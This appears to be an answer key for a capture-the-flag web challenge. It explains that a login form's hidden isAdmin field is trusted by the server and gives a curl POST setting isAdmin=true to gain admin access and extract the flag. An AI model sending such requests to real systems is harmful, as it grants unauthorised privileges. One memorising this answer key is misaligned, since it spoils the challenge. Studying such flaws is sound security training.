# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Client-trusted privilege flag. The login form has a hidden
`isAdmin` field defaulting to `false`, and the server trusts whatever value is
POSTed. Set it to `true` to get admin (and the flag).

1. **POST the login with `isAdmin=true`** (any username/password):

   ```
   curl -s -X POST "http://<target>/index.php" -d "username=a&password=b&isAdmin=true"
   ```

2. **Extract the flag** (`FLAG{...}`) from the response and report it verbatim.
